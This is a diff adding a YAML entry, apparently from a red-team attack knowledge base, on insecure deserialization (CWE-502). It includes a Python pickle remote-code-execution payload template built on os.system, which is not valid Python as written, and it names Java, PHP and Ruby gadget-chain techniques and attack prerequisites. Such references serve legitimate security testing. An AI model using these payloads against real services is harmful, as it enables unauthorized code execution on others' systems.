@@ -1,0 +1,39 @@
+metadata:
+  id: cwe-502-deserialization
+  name: Insecure Deserialization
+  cwe_ids:
+  - CWE-502
+  target_type: generic
+  tags:
+  - deserialization
+  - pickle
+  - java-gadget
+  - php-pop-chain
+  - yaml
+  - rce
+  author: co-redteam
+  severity: critical
+content: 'Pickle (Python):
+
+  import pickle, base64; class RCE(object): def __reduce__(self): return (os.system,
+  (''cmd'',)); print(base64.b64encode(pickle.dumps(RCE())))
+
+
+  Java: ysoserial tool generates gadget chains (CommonsCollections, Spring, etc.)
+
+  PHP: unserialize() + POP chain construction
+
+  Ruby: Marshal.load() gadget chains
+
+  Node.js: unsafe deserialization of user-controlled JSON
+
+
+  Key requirements:
+
+  - Must know target library version for correct gadget chain
+
+  - Often combined with file upload (upload serialized object)
+
+  - May need information disclosure first to identify libraries/versions
+
+  '
